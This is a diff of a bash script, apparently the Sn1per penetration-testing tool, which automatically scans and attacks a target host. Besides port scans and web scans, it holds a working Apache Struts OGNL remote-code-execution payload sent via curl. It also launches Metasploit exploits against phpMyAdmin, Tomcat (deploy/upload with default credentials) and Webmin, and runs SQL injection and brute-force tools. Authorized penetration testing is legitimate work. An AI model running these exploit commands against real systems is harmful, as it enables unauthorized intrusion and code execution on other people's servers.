+    echo -e "${OKRED}[+] Domains saved to: $LOOT_DIR/domains/domains-$TARGET-full.txt"
+    cat $LOOT_DIR/domains/domains-$TARGET-crt.txt > /tmp/curl.out 2> /dev/null
+    cat $LOOT_DIR/domains/domains-$TARGET.txt >> /tmp/curl.out 2> /dev/null
+    sort -u /tmp/curl.out > $LOOT_DIR/domains/domains-$TARGET-full.txt
+    rm -f /tmp/curl.out 2> /dev/null
+    echo -e "$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED CHECKING FOR SUBDOMAIN HIJACKING $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    for a in `cat $LOOT_DIR/domains/domains-$TARGET-full.txt`; do dig $a CNAME | egrep -i 'wordpress|instapage|heroku|github|bitbucket|squarespace|fastly|feed|fresh|ghost|helpscout|helpjuice|instapage|pingdom|surveygizmo|teamwork|tictail|shopify|desk|teamwork|unbounce|helpjuice|helpscout|pingdom|tictail|campaign|monitor|cargocollective|statuspage|tumblr|amazon|hubspot|cloudfront|modulus|unbounce|uservoice|wpengine' 2>/dev/null; done;
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED CHECKING EMAIL SECURITY $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    python $PLUGINS_DIR/SimpleEmailSpoofer/spoofcheck.py $TARGET 2>/dev/null
+    echo ""
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED STARTING DOMAIN FLYOVER $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    aquatone-discover -d $TARGET -t 100 --wordlist $PLUGINS_DIR/Sublist3r/subdomains.lst
+    aquatone-takeover -d $TARGET -t 100 
+    aquatone-scan -d $TARGET -t 100 -p80,443
+    aquatone-gather -d $TARGET -t 100 
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED STARTING PUBLIC S3 BUCKET SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    cd $PLUGINS_DIR/slurp/
+    ./slurp-linux-amd64 domain --domain $TARGET
+    cd $INSTALL_DIR
+    echo ""
+  fi
 fi
 echo ""
-echo -e "$OKGREEN + -- ----------------------------=[Pinging host]=---------------------------- -- +$RESET"
+echo -e "${OKGREEN}====================================================================================${RESET}"
+echo -e "$OKRED PINGING HOST $RESET"
+echo -e "${OKGREEN}====================================================================================${RESET}"
 ping -c 1 $TARGET
 echo ""
-echo -e "$OKGREEN + -- ----------------------------=[Running TCP port scan]=------------------- -- +$RESET"
+echo -e "${OKGREEN}====================================================================================${RESET}"
+echo -e "$OKRED RUNNING TCP PORT SCAN $RESET"
+echo -e "${OKGREEN}====================================================================================${RESET}"
 if [ -z "$OPT1" ]; then
   nmap -sS -T5 --open -Pn -p $DEFAULT_PORTS $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
 elif [ "$OPT1" == "web" ]; then
   nmap -sV -T5 -Pn -p 80,443  --open $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
 else
   nmap -sS -T5 -Pn -p $OPT1 --open $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
-  echo -e "$OKGREEN + -- ----------------------------=[Running UDP port scan]=------------------- -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED RUNNING UDP PORT SCAN $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -sU -T5 -Pn -p U:$OPT1 --open $TARGET
 fi
 
@@ -1155,7 +1382,9 @@ if [ -z $DISABLE_POSTGRESQL ]; then
 fi
 
 echo ""
-echo -e "$OKGREEN + -- ----------------------------=[Running Intrusive Scans]=----------------- -- +$RESET"
+echo -e "${OKGREEN}====================================================================================${RESET}"
+echo -e "$OKRED RUNNING INTRUSIVE SCANS $RESET"
+echo -e "${OKGREEN}====================================================================================${RESET}"
 port_21=`grep 'portid="21"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_22=`grep 'portid="22"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_23=`grep 'portid="23"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
@@ -1275,14 +1504,20 @@ then
   echo -e "$OKRED + -- --=[Port 80 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 80 opened... running tests...$RESET"
-  echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED CHECKING FOR WAF $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   wafw00f http://$TARGET
   echo ""
-  echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED GATHERING HTTP INFO $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   whatweb http://$TARGET
   xsstracer $TARGET 80
   echo ""
-  echo -e "$OKGREEN + -- ----------------------------=[Checking HTTP Headers]=------------------- -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED CHECKING HTTP HEADERS $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   echo -e "$OKBLUE+ -- --=[Checking if X-Content options are enabled on $TARGET...$RESET $OKORANGE"
   curl -s --insecure -I http://$TARGET | egrep -i 'X-Content' | tail -n 10
   echo ""
@@ -1333,9 +1568,9 @@ else
   curl -s --insecure http://$TARGET/test.aspx -L | egrep -i 'Error|Exception|System.Web.' | tail -n 10
   echo ""
   echo -e "$RESET"
-  echo -e "$OKGREEN + -- ----------------------------=[Running Web Vulnerability Scan]=---------- -- +$RESET"
-  nikto -h http://$TARGET
-  echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED SAVING SCREENSHOTS $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$TARGET-port80.jpg"
   if [ ${DISTRO} == "blackarch"  ]; then
     /bin/CutyCapt --url=http://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port80.jpg
@@ -1344,49 +1579,78 @@ else
   fi
   if [ "$MODE" = "web" ];
   then
-    echo -e "$OKGREEN + -- ----------------------------=[Running NMap HTTP Scripts]=--------------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP HTTP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     nmap -A -Pn -T5 -p 80 -sV --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-vuln* $TARGET
-    echo -e "$OKGREEN + -- ----------------------------=[Running Directory Brute Force]=----------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNING FILE/DIRECTORY BRUTE FORCE $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     #dirb http://$TARGET
     python $PLUGINS_DIR/cansina/cansina.py -u http://$TARGET:$PORT -p $PLUGINS_DIR/cansina/dirbuster-quick.txt
-    echo -e "$OKGREEN + -- ----------------------------=[Enumerating Common Web Software]=--------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED ENUMERATING WEB SOFTWARE $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     clusterd -i $TARGET
-    echo -e "$OKGREEN + -- ----------------------------=[Running Wordpress Vulnerability Scans]=--- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING WORDPRESS VULNERABILITY SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     wpscan --url http://$TARGET --batch
     echo ""
     wpscan --url http://$TARGET/wordpress/ --batch
     echo ""
-    echo -e "$OKGREEN + -- ----------------------------=[Running CMSMap]=-------------------------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING CMSMAP $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     python $CMSMAP -t http://$TARGET
     echo ""
     python $CMSMAP -t http://$TARGET/wordpress/
     echo ""
-    echo -e "$OKGREEN + -- ----------------------------=[Running Arachni Web Application Scan]=---- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING WEB VULNERABILITY SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nikto -h http://$TARGET
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING ARACHNI WEB APPLICATION SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     mkdir -p $INSTALL_DIR/loot/web/$TARGET-http/ 2> /dev/null
     arachni --report-save-path=$INSTALL_DIR/loot/web/$TARGET-http/ --output-only-positives http://$TARGET
     cd $INSTALL_DIR/loot/web/$TARGET-http/
     arachni_reporter $INSTALL_DIR/loot/web/$TARGET-http/*.afr --report=html:outfile=$INSTALL_DIR/loot/web/$TARGET-http/arachni.zip
     unzip $INSTALL_DIR/loot/web/$TARGET-http/arachni.zip
     cd $INSTALL_DIR
-    echo -e "$OKGREEN + -- ----------------------------=[Running SQLMap SQL Injection Scan]=------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING SQLMAP SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     sqlmap -u "http://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
-    echo -e "$OKGREEN + -- ----------------------------=[Running PHPMyAdmin Metasploit Exploit]=--- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING PHPMYADMIN METASPLOIT EXPLOIT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
-    echo -e "$OKGREEN + -- ----------------------------=[Running ShellShock Auto-Scan Exploit]=---- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING SHELLSHOCK EXPLOIT SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     python $PLUGINS_DIR/shocker/shocker.py -H $TARGET --cgilist $PLUGINS_DIR/shocker/shocker-cgi_list --port 80
-    echo -e "$OKGREEN + -- ----------------------------=[Running Apache Jakarta RCE Exploit]=------ -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING APACHE JAKARTA RCE EXPLOIT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     curl -s -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" http://$TARGET | head -n 1
   fi
 
-  if [ $SCAN_TYPE == "DOMAIN" ];
-  then
-    if [ "$GOOHAK" = "0" ]; then
-      echo -e "$OKGREEN + -- ----------------------------=[Skipping Google Hacking Queries]=-------------------- -- +$RESET"
+  if [ $SCAN_TYPE == "DOMAIN" ] && [ $OSINT == "1" ]; then
+    if [ $GOOHAK == "0" ]; then
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED SKIPPING GOOGLE HACKING QUERIES $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
     else
-      echo -e "$OKGREEN + -- ----------------------------=[Running Google Hacking Queries]=--------------------- -- +$RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING GOOGLE HACKING QUERIES $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
       goohak $TARGET > /dev/null
     fi
-    echo -e "$OKGREEN + -- ----------------------------=[Running InUrlBR OSINT Queries]=---------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING INURLBR OSINT QUERIES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     php $INURLBR --dork "site:$TARGET" -s inurlbr-$TARGET.txt
     rm -Rf output/ cookie.txt exploits.conf
     GHDB="1"
@@ -1426,7 +1690,9 @@ then
 else
   echo -e "$OKORANGE + -- --=[Port 139 opened... running tests...$RESET"
   SMB="1"
-  echo -e "$OKGREEN + -- ----------------------------=[Running SMB Enumeration]=----------------- -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED RUNNING SMB ENUMERATION $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   enum4linux $TARGET
   python $SAMRDUMP $TARGET
   nbtscan $TARGET
@@ -1465,20 +1731,21 @@ then
   echo -e "$OKRED + -- --=[Port 443 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 443 opened... running tests...$RESET"
-  echo -e "$OKGREEN + -- ----------------------------=[Checking for WAF]=------------------------ -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED CHECKING FOR WAF $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   wafw00f https://$TARGET
   echo ""
-  echo -e "$OKGREEN + -- ----------------------------=[Checking Cloudflare]=--------------------- -- +$RESET"
-  cd $PLUGINS_DIR/CloudFail/
-  python3 cloudfail.py --target $TARGET
-  cd $INSTALL_DIR
-  echo -e "$OKGREEN + -- ----------------------------=[Gathering HTTP Info]=--------------------- -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED GATHERING HTTP INFO $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   whatweb https://$TARGET
   echo ""
-  echo -e "$OKGREEN + -- ----------------------------=[Gathering SSL/TLS Info]=------------------ -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED GATHERING SSL/TLS INFO $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET
   sslscan --no-failed $TARGET
-  testssl $TARGET
   echo ""
   if [ $DISTRO == "blackarch" ]; then
     massbleed $TARGET port 443
@@ -1487,7 +1754,9 @@ else
     ./massbleed $TARGET port 443
   fi
   cd $INSTALL_DIR
-  echo -e "$OKGREEN + -- ----------------------------=[Checking HTTP Headers]=------------------- -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED CHECKING HTTP HEADERS $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   echo -e "$OKBLUE+ -- --=[Checking if X-Content options are enabled on $TARGET...$RESET $OKORANGE"
   curl -s --insecure -I https://$TARGET | egrep -i 'X-Content' | tail -n 10
   echo ""
@@ -1538,9 +1807,9 @@ else
   curl -s --insecure https://$TARGET/test.aspx -L | egrep -i 'Error|Exception|System.Web.' | tail -n 10
   echo ""
   echo -e "$RESET"
-  echo -e "$OKGREEN + -- ----------------------------=[Running Web Vulnerability Scan]=---------- -- +$RESET"
-  nikto -h https://$TARGET
-  echo -e "$OKGREEN + -- ----------------------------=[Saving Web Screenshots]=------------------ -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED SAVING SCREENSHOTS $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   if [ ${DISTRO} == "blackarch"  ]; then
     /bin/CutyCapt --url=https://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port443.jpg
   else
@@ -1550,55 +1819,78 @@ else
 
   if [ "$MODE" = "web" ];
   then
-    echo -e "$OKGREEN + -- ----------------------------=[Running NMap HTTP Scripts]=--------------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP HTTP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     nmap -A -sV -T5 -Pn -p 443 --script=/usr/share/nmap/scripts/iis-buffer-overflow.nse --script=http-vuln* $TARGET
-    echo -e "$OKGREEN + -- ----------------------------=[Running Directory Brute Force]=----------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING FILE/DIRECTORY BRUTE FORCE $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     #dirb https://$TARGET
     python $PLUGINS_DIR/cansina/cansina.py -u https://$TARGET:$PORT -p $PLUGINS_DIR/cansina/dirbuster-quick.txt
-    echo -e "$OKGREEN + -- ----------------------------=[Enumerating Common Web Software]=--------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED ENUMERATING WEB SOFTWARE $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     clusterd --ssl -i $TARGET
-    echo -e "$OKGREEN + -- ----------------------------=[Running Wordpress Vulnerability Scans]=--- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING WORDPRESS VULNERABILITY SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     wpscan --url https://$TARGET --batch
     echo ""
     wpscan --url https://$TARGET/wordpress/ --batch
-    echo -e "$OKGREEN + -- ----------------------------=[Running CMSMap]=-------------------------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING CMSMAP $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     python $CMSMAP -t https://$TARGET
     echo ""
     python $CMSMAP -t https://$TARGET/wordpress/
     echo ""
-    if [ $ARACHNI == "1" ];
-    then
-      echo -e "$OKGREEN + -- ----------------------------=[Skipping Arachni Scan]=------------------- -- +$RESET"
-    else
-      echo -e "$OKGREEN + -- ----------------------------=[Running Arachni Web Application Scan]=---- -- +$RESET"
-      mkdir -p $INSTALL_DIR/loot/web/$TARGET-https/ 2> /dev/null
-      arachni --report-save-path=$INSTALL_DIR/loot/web/$TARGET-https/ --output-only-positives https://$TARGET
-      cd $INSTALL_DIR/loot/web/$TARGET-https/
-      arachni_reporter $INSTALL_DIR/loot/web/$TARGET-https/*.afr --report=html:outfile=$INSTALL_DIR/loot/web/$TARGET-https/arachni.zip
-      unzip $INSTALL_DIR/loot/web/$TARGET-https/arachni.zip
-      cd $INSTALL_DIR
-    fi
-    echo -e "$OKGREEN + -- ----------------------------=[Running SQLMap SQL Injection Scan]=------- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING WEB VULNERABILITY SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nikto -h https://$TARGET
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING ARACHNI WEB APPLICATION SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    mkdir -p $INSTALL_DIR/loot/web/$TARGET-https/ 2> /dev/null
+    arachni --report-save-path=$INSTALL_DIR/loot/web/$TARGET-https/ --output-only-positives https://$TARGET
+    cd $INSTALL_DIR/loot/web/$TARGET-https/
+    arachni_reporter $INSTALL_DIR/loot/web/$TARGET-https/*.afr --report=html:outfile=$INSTALL_DIR/loot/web/$TARGET-https/arachni.zip
+    unzip $INSTALL_DIR/loot/web/$TARGET-https/arachni.zip
+    cd $INSTALL_DIR
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING SQLMAP SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     sqlmap -u "https://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
-    echo -e "$OKGREEN + -- ----------------------------=[Running PHPMyAdmin Metasploit Exploit]=--- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING PHPMYADMIN METASPLOIT EXPLOIT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     msfconsole -x "use exploit/multi/http/phpmyadmin_3522_backdoor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 443; run; use exploit/unix/webapp/phpmyadmin_config; run; use multi/http/phpmyadmin_preg_replace; run; exit;"
-    echo -e "$OKGREEN + -- ----------------------------=[Running ShellShock Auto-Scan Exploit]=---- -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING SHELLSHOCK EXPLOIT SCAN $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     python $PLUGINS_DIR/shocker/shocker.py -H $TARGET --cgilist $PLUGINS_DIR/shocker/shocker-cgi_list --port 443 --ssl
-    echo -e "$OKGREEN + -- ----------------------------=[Running Apache Jakarta RCE Exploit]=------ -- +$RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING APACHE JAKARTA RCE EXPLOIT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
     curl -s -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" https://$TARGET | head -n 1
   fi
 
-  if [ $SCAN_TYPE == "DOMAIN" ];
-  then
-    if [ -z $GHDB ];
-    then
-      if [ "$GOOHAK" = "0" ]; then
-        echo -e "$OKGREEN + -- ----------------------------=[Skipping Google Hacking Queries]=-------------------- -- +$RESET"
+  if [ $SCAN_TYPE == "DOMAIN" ] && [ $OSINT == "1" ]; then
+    if [ -z $GHDB ]; then
+      if [ $GOOHAK == "0" ]; then
+        echo -e "${OKGREEN}====================================================================================${RESET}"
+        echo -e "$OKRED SKIPPING GOOGLE HACKING QUERIES $RESET"
+        echo -e "${OKGREEN}====================================================================================${RESET}"
       else
-        echo -e "$OKGREEN + -- ----------------------------=[Running Google Hacking Queries]=--------------------- -- +$RESET"
+        echo -e "${OKGREEN}====================================================================================${RESET}"
+        echo -e "$OKRED RUNNING GOOGLE HACKING QUERIES $RESET"
+        echo -e "${OKGREEN}====================================================================================${RESET}"
         goohak $TARGET > /dev/null
       fi
-      echo -e "$OKGREEN + -- ----------------------------=[Running InUrlBR OSINT Queries]=----------- -- +$RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING INURLBR OSINT QUERIES $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
       php $INURLBR --dork "site:$TARGET" -s inurlbr-$TARGET.txt
       rm -Rf output/ cookie.txt exploits.conf
     fi
@@ -1910,9 +2202,13 @@ else
     cutycapt --url=http://$TARGET:8180 --out=$LOOT_DIR/screenshots/$TARGET-port8180.jpg
   fi
   nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -p 8180 -T5 --script=*proxy* $TARGET
-  echo -e "$OKGREEN + -- ----------------------------=[Launching Webmin File Disclosure Exploit]= -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED RUNNING WEBMIN FILE DISCLOSURE EXPLOIT $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   msfconsole -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
-  echo -e "$OKGREEN + -- ----------------------------=[Launching Tomcat Exploits]=--------------- -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED RUNING APACHE TOMCAT EXPLOITS $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   msfconsole -x "use admin/http/tomcat_administration; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8180; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum; run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"
 fi
 
@@ -1964,8 +2260,9 @@ then
   echo -e "$OKRED + -- --=[Port 10000 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 10000 opened... running tests...$RESET"
-  echo -e "$OKGREEN + -- ----------------------------=[Scanning For Common Vulnerabilities]=----- -- +$RESET"
-  echo -e "$OKGREEN + -- ----------------------------=[Launching Webmin File Disclosure Exploit]= -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED RUNNING WEBMIN FILE DISCLOSURE EXPLOIT $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   msfconsole -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
 fi
 
@@ -2018,7 +2315,9 @@ else
   $SUPER_MICRO_SCAN $TARGET
 fi
 
-echo -e "$OKGREEN + -- ----------------------------=[Scanning For Common Vulnerabilities]=----- -- +$RESET"
+echo -e "${OKGREEN}====================================================================================${RESET}"
+echo -e "$OKRED SCANNING FOR COMMON VULNERABILITIES $RESET"
+echo -e "${OKGREEN}====================================================================================${RESET}"
 if [ ${DISTRO} == "blackarch" ]; then
   /bin/yasuo -r $TARGET -b all
 else
@@ -2028,18 +2327,28 @@ fi
 cd $SNIPER_DIR
 
 if [ "$FULLNMAPSCAN" = "0" ]; then
-  echo -e "$OKGREEN + -- ----------------------------=[Skipping Full NMap Port Scan]=------------ -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED SKIPPING FULL NMAP PORT SCAN $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
 else
-  echo -e "$OKGREEN + -- ----------------------------=[Performing Full NMap Port Scan]=---------- -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED RUNNING FULL PORT SCAN $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   nmap -Pn -T4 -sV  -O -v -p 1-65355 $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml
-  echo -e "$OKGREEN + -- ----------------------------=[Enumerating Exploits via Searchsploit]=--- -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED ENUMERATING EXPLOITS $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   searchsploit -v --nmap $LOOT_DIR/nmap/nmap-$TARGET.xml
 fi
 
 if [ "$AUTOBRUTE" = "0" ]; then
-  echo -e "$OKGREEN + -- ----------------------------=[Skipping Brute Force]=-------------------- -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED SKIPPING BRUTE FORCE $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
 else
-  echo -e "$OKGREEN + -- ----------------------------=[Running Brute Force]=--------------------- -- +$RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED RUNNING BRUTE FORCE $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
   brutex $TARGET
   cd $INSTALL_DIR
   rm -f hydra.restore
@@ -2049,5 +2358,7 @@ fi
 
 rm -f $LOOT_DIR/.fuse_* 2> /dev/null
 
-echo -e "$OKGREEN + -- ----------------------------=[Done]=------------------------------------ -- +$RESET"
+echo -e "${OKGREEN}====================================================================================${RESET}"
+echo -e "$OKRED SCAN COMPLETE! $RESET"
+echo -e "${OKGREEN}====================================================================================${RESET}"
 exit 0
